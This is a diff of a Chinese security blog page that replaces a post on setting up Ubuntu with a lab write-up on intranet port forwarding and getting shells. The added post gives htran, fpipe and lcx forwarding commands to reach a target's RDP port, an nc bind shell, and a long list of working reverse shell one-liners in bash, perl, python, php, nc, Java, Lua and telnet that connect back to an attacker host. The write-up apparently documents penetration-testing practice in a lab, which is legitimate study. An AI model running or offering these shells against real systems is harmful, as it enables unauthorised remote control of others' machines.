@@ -60,7 +60,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Ubuntu," />
+  <meta name="keywords" content="端口转发,代理," />
 
 
 
@@ -76,18 +76,18 @@
 
 
 
-<meta name="description" content="如题所示">
-<meta name="keywords" content="Ubuntu">
+<meta name="description" content="如题">
+<meta name="keywords" content="端口转发,代理">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Ubuntu安装完成可以做的一些事">
-<meta property="og:url" content="http://maplege.github.io/2017/08/29/newUbuntu/index.html">
+<meta property="og:title" content="内网攻击环境模拟（端口转发）">
+<meta property="og:url" content="http://maplege.github.io/2017/09/05/portForward/index.html">
 <meta property="og:site_name" content="MapleGe">
-<meta property="og:description" content="如题所示">
+<meta property="og:description" content="如题">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-08-29T06:13:35.669Z">
+<meta property="og:updated_time" content="2017-09-05T14:10:23.628Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Ubuntu安装完成可以做的一些事">
-<meta name="twitter:description" content="如题所示">
+<meta name="twitter:title" content="内网攻击环境模拟（端口转发）">
+<meta name="twitter:description" content="如题">
 
 
 
@@ -117,13 +117,13 @@
 
 
 
-  <link rel="canonical" href="http://maplege.github.io/2017/08/29/newUbuntu/"/>
+  <link rel="canonical" href="http://maplege.github.io/2017/09/05/portForward/"/>
 
 
 
 
 
-  <title>Ubuntu安装完成可以做的一些事 | MapleGe</title>
+  <title>内网攻击环境模拟（端口转发） | MapleGe</title>
   
 
 
@@ -294,7 +294,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://maplege.github.io/2017/08/29/newUbuntu/">
+    <link itemprop="mainEntityOfPage" href="http://maplege.github.io/2017/09/05/portForward/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="暮沉沉">
@@ -311,7 +311,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Ubuntu安装完成可以做的一些事</h1>
+          <h1 class="post-title" itemprop="name headline">内网攻击环境模拟（端口转发）</h1>
         
 
         <div class="post-meta">
@@ -323,8 +323,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-29T14:12:16+08:00">
-                2017-08-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-05T22:08:13+08:00">
+                2017-09-05
               </time>
             
 
@@ -346,8 +346,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Ubuntu/" itemprop="url" rel="index">
-                    <span itemprop="name">Ubuntu</span>
+                  <a href="/categories/端口转发/" itemprop="url" rel="index">
+                    <span itemprop="name">端口转发</span>
                   </a>
                 </span>
 
@@ -378,7 +378,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  662
+                  1,273
                 </span>
               
 
@@ -394,7 +394,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3
+                  6
                 </span>
               
             </div>
@@ -415,27 +415,16 @@
       
 
       
-        <p>如题所示<br><a id="more"></a></p>
-<h1 id="可以做的有："><a href="#可以做的有：" class="headerlink" title="可以做的有："></a>可以做的有：</h1><h2 id="1、换源"><a href="#1、换源" class="headerlink" title="1、换源"></a>1、换源</h2><p>根据自己安装的Ubuntu版本，去网上找相应的源，源文件位置：/etc/apt/source.list<br>这里给出Ubuntu14.04搜狐源：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">deb http://mirrors.sohu.com/ubuntu/ trusty main restricted universe multiverse</div><div class="line">deb http://mirrors.sohu.com/ubuntu/ trusty-security main restricted universe multiverse</div><div class="line">deb http://mirrors.sohu.com/ubuntu/ trusty-updates main restricted universe multiverse</div><div class="line">deb http://mirrors.sohu.com/ubuntu/ trusty-proposed main restricted universe multiverse</div><div class="line">deb http://mirrors.sohu.com/ubuntu/ trusty-backports main restricted universe multiverse</div><div class="line">deb-src http://mirrors.sohu.com/ubuntu/ trusty main restricted universe multiverse</div><div class="line">deb-src http://mirrors.sohu.com/ubuntu/ trusty-security main restricted universe multiverse</div><div class="line">deb-src http://mirrors.sohu.com/ubuntu/ trusty-updates main restricted universe multiverse</div><div class="line">deb-src http://mirrors.sohu.com/ubuntu/ trusty-proposed main restricted universe multiverse</div><div class="line">deb-src http://mirrors.sohu.com/ubuntu/ trusty-backports main restricted universe multiverse</div></pre></td></tr></table></figure>
-<p>将上面内容复制后，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vim /etc/apt/source.list</div></pre></td></tr></table></figure></p>
-<p>编辑源文件，在命令行模式下按p进行粘贴，输入:wq回车，进行保存</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update	 #更新软件索引列表</div><div class="line">sudo apt-get upgrade	#更新所有软件（不建议）</div></pre></td></tr></table></figure>
-<h2 id="2、安装SSH、FTP、Telnet（有的系统会自行安装）"><a href="#2、安装SSH、FTP、Telnet（有的系统会自行安装）" class="headerlink" title="2、安装SSH、FTP、Telnet（有的系统会自行安装）"></a>2、安装SSH、FTP、Telnet（有的系统会自行安装）</h2><ul>
-<li>先尝试service /etc/init.d/ssh start    或者 cd /etc/init.d    </li>
-<li>再service ssh start</li>
-<li>若是无回显则ssh开启， service ssh status    查看ssh状态</li>
-<li>若是出错则sudo apt-get install ssh    进行安装</li>
-<li>安装完成后再执行上面的操作</li>
-<li>apt-get install vsftpd        安装ftp服务器</li>
-</ul>
-<h2 id="3、安装-vmware-tools"><a href="#3、安装-vmware-tools" class="headerlink" title="3、安装 vmware tools"></a>3、安装 vmware tools</h2><p>图形化的可以在页面上点击安装vmware-tools进行安装</p>
-<p>命令行可以apt-get install open-vm-tools-desktop fuse</p>
-<h2 id="4、安装截图工具ksnapshot"><a href="#4、安装截图工具ksnapshot" class="headerlink" title="4、安装截图工具ksnapshot"></a>4、安装截图工具ksnapshot</h2><p>apt-get install ksnapshot<br>使用命令    ksnapshot-region    可以截屏，将该命令设置为快捷键方别使用</p>
-<h2 id="5、重新安装vim"><a href="#5、重新安装vim" class="headerlink" title="5、重新安装vim"></a>5、重新安装vim</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">apt-get remove vim-common	#删除原版</div><div class="line">apt-get install vim			#安装新版</div><div class="line">#简单配置VIM</div><div class="line">vim /etc/vim/vimrc</div><div class="line">#设置语法高亮:</div><div class="line">命令行模式下输入/syn	找到	syntax on	这一行，去掉前面的双引号（双引号是注释的意思）</div><div class="line">添加行号</div><div class="line">命令行模式下shift+g跳到末尾行，添加新行：set nu</div><div class="line">自动缩进</div><div class="line">文本末尾添加一行：set autoindent	自动缩进</div><div class="line">再添加一行：set cindent	针对C语言自动缩进</div><div class="line">#设定缩进</div><div class="line">set tabstop=4	#设定tab键缩进的空格数</div><div class="line">set shiftwidth=4	   #设定编辑器将多少空格视为一个缩进</div></pre></td></tr></table></figure>
-<h2 id="6、支持Xshell进行上传下载"><a href="#6、支持Xshell进行上传下载" class="headerlink" title="6、支持Xshell进行上传下载"></a>6、支持Xshell进行上传下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install rpm</div><div class="line">apt-get install lrzsz</div></pre></td></tr></table></figure>
-<h2 id="7、redis-tools"><a href="#7、redis-tools" class="headerlink" title="7、redis-tools"></a>7、redis-tools</h2><p>apt-get install redis-tools</p>
-<h2 id="渗透工具安装："><a href="#渗透工具安装：" class="headerlink" title="渗透工具安装："></a>渗透工具安装：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">netdiscover	用来嗅探存活主机</div><div class="line">apt-get netdiscover	安装命令</div><div class="line">netdiscover -r 192.168.1.0/24		扫描本地网络主机</div><div class="line">nmap	</div><div class="line">apt-get install nmap		</div><div class="line">whatweb</div><div class="line">apt-get install whatweb CMS识别</div><div class="line">hydra</div><div class="line">apt-get install hydra 密码破解</div><div class="line">proxychains</div><div class="line">apt-get install proxychains	端口代理</div><div class="line">redsktop</div><div class="line">apt-get install rdesktop	远程登录windows</div><div class="line"></div><div class="line">安装sqlmap/metasploit/wpscan</div></pre></td></tr></table></figure>
+        <p>如题<br><a id="more"></a></p>
+<h1 id="内网攻击环境模拟（端口转发）"><a href="#内网攻击环境模拟（端口转发）" class="headerlink" title="内网攻击环境模拟（端口转发）"></a>内网攻击环境模拟（端口转发）</h1><h2 id="测试工具："><a href="#测试工具：" class="headerlink" title="测试工具："></a>测试工具：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">htran3</div><div class="line">fpipe</div><div class="line">lcx</div><div class="line">nc（linux、windows）</div><div class="line">bash</div><div class="line">python</div><div class="line">php</div><div class="line">nc 无e</div><div class="line">ssh代理</div></pre></td></tr></table></figure>
+<h2 id="总体环境概况"><a href="#总体环境概况" class="headerlink" title="总体环境概况"></a>总体环境概况</h2><p>（总的环境，具体每个工具使用时可能会有所出入）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">攻击机：ubu_ter		192.168.20.149</div><div class="line">攻击机：win10		192.168.20.191	192.168.20.76</div><div class="line">服务器：ubu_blog	192.168.20.111	192.168.174.11</div><div class="line">服务器：server2003	192.168.174.129	192.168.20.181</div><div class="line">目标机：Ubuntu2		192.168.174.128</div><div class="line">目标机：winXP		192.168.174.130</div></pre></td></tr></table></figure>
+<h2 id="实验一、使用htran-exe远程登录目标winXP的3389"><a href="#实验一、使用htran-exe远程登录目标winXP的3389" class="headerlink" title="实验一、使用htran.exe远程登录目标winXP的3389"></a>实验一、使用htran.exe远程登录目标winXP的3389</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">**环境：**</div><div class="line">攻击机（个人笔记本，内网）：Ubuntu2		192.168.20.145</div><div class="line">攻击机（VPS，公网）：win10		192.168.20.191	192.168.20.76</div><div class="line">服务器（公网，目标内网）：server2003	192.168.174.129	192.168.20.181</div><div class="line">目标机（目标内网）：winXP		192.168.174.130</div><div class="line"></div><div class="line">**步骤：**</div><div class="line">攻击机win10上执行：htran3.exe -Listen 9999 8888</div><div class="line">服务器server2003上执行：htran3.exe -slave 192.168.20.191 9999 192.168.174.130 3389</div><div class="line">用法：htr3.exe -slave 攻击机IP 攻击机监听端口 目标机IP 目标机端口</div><div class="line">将目标机的3389端口转发到本地的8888端口，使用另一台攻击机Ubuntu2的rdesktop连接win10的8888端口即可</div></pre></td></tr></table></figure>
+<h2 id="实验二、使用fpipe远程登录目标winXP的3389"><a href="#实验二、使用fpipe远程登录目标winXP的3389" class="headerlink" title="实验二、使用fpipe远程登录目标winXP的3389"></a>实验二、使用fpipe远程登录目标winXP的3389</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">**环境：**</div><div class="line">攻击机（VPS，公网）：win10		192.168.20.191	192.168.20.76</div><div class="line">攻击机（个人笔记本，内网）：Ubuntu2		192.168.20.145</div><div class="line">服务器（公网，目标内网）：server2003	192.168.174.129	192.168.20.181</div><div class="line">目标机（目标内网）：winXP		192.168.174.130</div><div class="line"></div><div class="line">**步骤：**</div><div class="line">在服务器上执行：fpipe.exe -l 1234 -s 1000 -r 3389 192.168.174.130</div><div class="line">意思是将发送到服务器本机1000端口的链接通过1234端口被重定向到了目标机IP的3389端口上，然后再链接服务器的1234端口，即可链接到目标机的3389上</div><div class="line">然后在攻击机上使用mstsc链接192.168.20.181:1234</div><div class="line">疑惑：</div><div class="line">在攻击机win10上使用mstsc进行链接，刚建立连接就会断开</div><div class="line">在攻击机ubuntu2上使用rdesktop进行链接，成功建立长时间连接</div></pre></td></tr></table></figure>
+<h2 id="实验三、使用lcx远程登录目标winXP的3389"><a href="#实验三、使用lcx远程登录目标winXP的3389" class="headerlink" title="实验三、使用lcx远程登录目标winXP的3389"></a>实验三、使用lcx远程登录目标winXP的3389</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">**环境：**</div><div class="line">攻击机（VPS，公网）：win10		192.168.20.191	</div><div class="line">攻击机（个人笔记本，内网）：Ubuntu2		192.168.20.145</div><div class="line">服务器（公网，目标内网）：server2003	192.168.174.129	192.168.20.181</div><div class="line">目标机（目标内网）：winXP		192.168.174.130</div><div class="line"></div><div class="line">**步骤：**</div><div class="line">先在win10上：lcx.exe -listen 51 3389</div><div class="line">监听51端口，转发到本机的3389端口</div><div class="line">然后在服务器上执行：lcx.exe -slave 192.168.20.191 51 192.168.174.130 3389</div><div class="line">将目标机winXP的3389转发到攻击机win10（VPS）的51端口上</div><div class="line">在攻击机Ubuntu2上：rdesktop 192.168.20.191:3389</div></pre></td></tr></table></figure>
+<h2 id="实验四、使用nc得到服务器server2003的cmdShell"><a href="#实验四、使用nc得到服务器server2003的cmdShell" class="headerlink" title="实验四、使用nc得到服务器server2003的cmdShell"></a>实验四、使用nc得到服务器server2003的cmdShell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">**环境：**</div><div class="line">攻击机：win10		192.168.20.191	</div><div class="line">服务器（公网，目标内网）：server2003	192.168.174.129	192.168.20.181</div><div class="line">目标机（目标内网）：winXP		192.168.174.130</div><div class="line"></div><div class="line">**步骤：**</div><div class="line">在服务器server2003上：nc -l -p 8888 -t -e cmd.exe（-t参数可省略）</div><div class="line">在攻击机win10上：nc -nvv  192.168.20.181 8888</div></pre></td></tr></table></figure>
+<h2 id="实验五、使用nc得到服务器ubu-blog的shell"><a href="#实验五、使用nc得到服务器ubu-blog的shell" class="headerlink" title="实验五、使用nc得到服务器ubu_blog的shell"></a>实验五、使用nc得到服务器ubu_blog的shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">**环境：**</div><div class="line">攻击机：Ubuntu2		192.168.20.145</div><div class="line">服务器：ubu_blog	192.168.20.111	192.168.174.11</div><div class="line">目标机：Ubuntu2		192.168.174.128</div><div class="line"></div><div class="line">**步骤：**</div><div class="line">在攻击机Ubuntu2上：nc -lvv 1234（如果有错再添加0.0.0.0，windows不行，-lvnp也可以）</div><div class="line">在服务器ubu_blog上：</div><div class="line">（1）bash版本</div><div class="line">bash -i &gt;&amp;/dev/tcp/192.168.20.149/1234 0&gt;&amp;1</div><div class="line">或： /bin/bash -i &gt; /dev/tcp/192.168.20.149/1234 0&lt;&amp;1 2&gt;&amp;1</div><div class="line">（2）perl版本</div><div class="line">perl -e &apos;use Socket;$i=&quot;192.168.20.149&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</div><div class="line">（3）python版本</div><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.20.149&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div><div class="line">（4）php版本</div><div class="line">php -r &apos;$sock=fsockopen(&quot;192.168.20.149&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div><div class="line">（5）nc -e /bin/sh 192.168.20.149 1234</div><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.20.149 1234 &gt;/tmp/f</div><div class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</div><div class="line">（6）JAVA版本（不会用）</div><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.20.149/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</div><div class="line">p.waitFor()</div><div class="line">（7）LUA版本（尝试失败）</div><div class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;192.168.20.149&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</div><div class="line">（8）Hacker:nc -lvnp listenport</div><div class="line">Victim:mknod /tmp/backpipe p</div><div class="line">Victim:/bin/sh 0&lt;/tmp/backpipe | nc 192.168.20.149 1234 1&gt;/tmp/backpipe</div><div class="line">（9）不使用nc</div><div class="line">Method 2:</div><div class="line">Hacker: nc -nvlpp8080</div><div class="line">Victim: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</div><div class="line">（10）Method 3:（尝试失败）</div><div class="line">Hacker: nc -nvlp 8080</div><div class="line">Hacker: nc -nvlp 8888</div><div class="line">Victim: telnet 192.168.20.149 8080 | /bin/bash | telnet 192.168.20.149 8888</div></pre></td></tr></table></figure>
+<h2 id="实验六、SSH代理（putty）"><a href="#实验六、SSH代理（putty）" class="headerlink" title="实验六、SSH代理（putty）"></a>实验六、SSH代理（putty）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">**环境：**</div><div class="line">代理服务器：ubu_ter	192.168.17.128（仅主机模式，不可上网）</div><div class="line">本地机：win10 	192.168.20.191（可上网），192.168.17.1</div><div class="line"></div><div class="line">**步骤：**</div><div class="line">打开putty的会话界面，填入主机名称和端口</div><div class="line">然后在左侧：连接——》SSH——》通道——》增加端口：7070，动态——》打开</div><div class="line">输入用户名和密码，登陆成功</div><div class="line">此时打开cmd，输入netstat -an，可以看到这么一条</div><div class="line">打开浏览器，在浏览器中设置代理：socks5 127.0.0.1:7070</div><div class="line">此时浏览器变得无法上网，设置成功</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -453,12 +442,12 @@
 	  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
 	    <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
 		  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-		    <p><span>本文标题:</span><a href="/2017/08/29/newUbuntu/">Ubuntu安装完成可以做的一些事</a></p>
+		    <p><span>本文标题:</span><a href="/2017/09/05/portForward/">内网攻击环境模拟（端口转发）</a></p>
 			  <p><span>文章作者:</span><a href="/" title="访问 暮沉沉 的个人博客">暮沉沉</a></p>
-			    <p><span>发布时间:</span>2017年08月29日 - 14:08</p>
-				  <p><span>最后更新:</span>2017年08月29日 - 14:08</p>
-				    <p><span>原始链接:</span><a href="/2017/08/29/newUbuntu/" title="Ubuntu安装完成可以做的一些事">http://maplege.github.io/2017/08/29/newUbuntu/</a>
-					    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://maplege.github.io/2017/08/29/newUbuntu/"  aria-label="复制成功！"></i></span>
+			    <p><span>发布时间:</span>2017年09月05日 - 22:09</p>
+				  <p><span>最后更新:</span>2017年09月05日 - 22:09</p>
+				    <p><span>原始链接:</span><a href="/2017/09/05/portForward/" title="内网攻击环境模拟（端口转发）">http://maplege.github.io/2017/09/05/portForward/</a>
+					    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://maplege.github.io/2017/09/05/portForward/"  aria-label="复制成功！"></i></span>
 						  </p>
 						    <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 							</div>
@@ -503,7 +492,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Ubuntu/" rel="tag"><i class="fa fa-tag"></i> Ubuntu</a>
+            <a href="/tags/端口转发/" rel="tag"><i class="fa fa-tag"></i> 端口转发</a>
+          
+            <a href="/tags/代理/" rel="tag"><i class="fa fa-tag"></i> 代理</a>
           
         </div>
       
@@ -516,8 +507,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/29/solveHexoImage/" rel="next" title="windows下解决图片上传的麻烦">
-                <i class="fa fa-chevron-left"></i> windows下解决图片上传的麻烦
+              <a href="/2017/09/04/socksTOhttp/" rel="next" title="Linux下使用privoxy将socks转换为http代理">
+                <i class="fa fa-chevron-left"></i> Linux下使用privoxy将socks转换为http代理
               </a>
             
           </div>
@@ -525,10 +516,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/08/31/phpcmsLoopholes/" rel="prev" title="phpcms漏洞利用【转载】">
-                phpcms漏洞利用【转载】 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -678,7 +665,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#可以做的有："><span class="nav-number">1.</span> <span class="nav-text">可以做的有：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、换源"><span class="nav-number">1.1.</span> <span class="nav-text">1、换源</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、安装SSH、FTP、Telnet（有的系统会自行安装）"><span class="nav-number">1.2.</span> <span class="nav-text">2、安装SSH、FTP、Telnet（有的系统会自行安装）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、安装-vmware-tools"><span class="nav-number">1.3.</span> <span class="nav-text">3、安装 vmware tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4、安装截图工具ksnapshot"><span class="nav-number">1.4.</span> <span class="nav-text">4、安装截图工具ksnapshot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5、重新安装vim"><span class="nav-number">1.5.</span> <span class="nav-text">5、重新安装vim</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6、支持Xshell进行上传下载"><span class="nav-number">1.6.</span> <span class="nav-text">6、支持Xshell进行上传下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7、redis-tools"><span class="nav-number">1.7.</span> <span class="nav-text">7、redis-tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透工具安装："><span class="nav-number">1.8.</span> <span class="nav-text">渗透工具安装：</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#内网攻击环境模拟（端口转发）"><span class="nav-number">1.</span> <span class="nav-text">内网攻击环境模拟（端口转发）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#测试工具："><span class="nav-number">1.1.</span> <span class="nav-text">测试工具：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总体环境概况"><span class="nav-number">1.2.</span> <span class="nav-text">总体环境概况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验一、使用htran-exe远程登录目标winXP的3389"><span class="nav-number">1.3.</span> <span class="nav-text">实验一、使用htran.exe远程登录目标winXP的3389</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验二、使用fpipe远程登录目标winXP的3389"><span class="nav-number">1.4.</span> <span class="nav-text">实验二、使用fpipe远程登录目标winXP的3389</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验三、使用lcx远程登录目标winXP的3389"><span class="nav-number">1.5.</span> <span class="nav-text">实验三、使用lcx远程登录目标winXP的3389</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验四、使用nc得到服务器server2003的cmdShell"><span class="nav-number">1.6.</span> <span class="nav-text">实验四、使用nc得到服务器server2003的cmdShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验五、使用nc得到服务器ubu-blog的shell"><span class="nav-number">1.7.</span> <span class="nav-text">实验五、使用nc得到服务器ubu_blog的shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验六、SSH代理（putty）"><span class="nav-number">1.8.</span> <span class="nav-text">实验六、SSH代理（putty）</span></a></li></ol></li></ol></div>
             
 
           </div>
